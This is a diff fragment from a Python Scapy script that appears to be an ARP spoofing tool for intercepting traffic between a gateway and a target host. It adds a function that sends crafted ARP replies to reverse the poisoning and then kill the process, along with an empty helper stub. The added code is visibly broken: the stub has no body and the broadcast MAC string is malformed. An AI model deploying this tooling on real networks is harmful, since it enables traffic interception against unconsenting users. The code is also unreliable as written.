@@ -16,6 +16,17 @@ conf.iface = interface
 #disable output
 conf.verb = 0
 
+def restore_target(gateway_ip, gateway_mac,target_ip,target_mac):
+    print"[*] Restoring target..."
+    send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff:", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff:", hwsrc=target_mac), count=5)
+
+    # tells to the main thread to terminate
+    os.kill(os.getpid(), signal.SIGINT)
+
+def get_mac(ip_address):
+
+
 print"[*] Setting up %s" % interface
 
 gateway_mac = get_mac(gateway_ip)
